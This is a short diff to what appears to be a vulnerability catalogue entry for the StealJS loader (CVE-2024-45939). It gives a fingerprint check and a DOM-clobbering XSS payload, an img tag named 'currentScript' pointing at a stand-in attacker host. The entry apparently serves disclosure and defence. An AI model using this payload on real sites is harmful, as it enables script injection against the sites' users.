@@ -6,7 +6,7 @@
 + Stars: 1.4K
 + Version: v2.3.0
 + Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"><img>```
 + Impact: XSS
 + CVE: CVE-2024-45939
 + Status: Accepted
